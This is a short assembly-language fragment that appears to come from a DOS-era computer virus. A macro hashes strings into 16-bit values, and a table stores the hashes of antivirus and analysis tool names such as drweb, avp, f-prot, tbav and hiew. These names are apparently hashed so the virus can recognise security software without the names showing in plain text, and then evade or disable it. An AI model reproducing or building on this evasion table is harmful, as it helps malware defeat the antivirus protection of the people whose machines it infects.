CRC MACRO shit
.386
LOCAL Summ, Res
Summ = 0
 IRP _Byte, <shit>
  Summ = (Summ+_Byte) shl 2
  Res = Summ shr 16
  Summ = (Summ or Res) and 0FFFFh
 ENDM
dw Summ
ENDM

CRC_Table:
CRC <'-','d'>
CRC <'-','d','3'>
CRC <'-','v'>
CRC <'a','d','i','n','f'>
CRC <'a','d','i','n','f','e','x','t'>
CRC <'a','i','d','s','t','e','s','t'>
CRC <'a','n','t','i','v','i','r'>
CRC <'a','v','p'>
CRC <'a','v','p','l','i','t','e'>
CRC <'c','l','e','a','n'>
CRC <'c','o','m','m','a','n','d'>
CRC <'d','r','w','e','b'>
CRC <'f','-','p','r','o','t'>
CRC <'f','f','o','r','m','a','t'>
CRC <'f','i','n','d','v','i','r','u'>
CRC <'g','u','a','r','d'>
CRC <'h','i','e','w'>
CRC <'m','s','a','v'>
CRC <'n','a','v'>
CRC <'s','c','a','n'>
CRC <'t','b','a','v'>
CRC <'t','b','s','c','a','n'>
CRC <'w','e','b'>
CRC <'w','i','n'>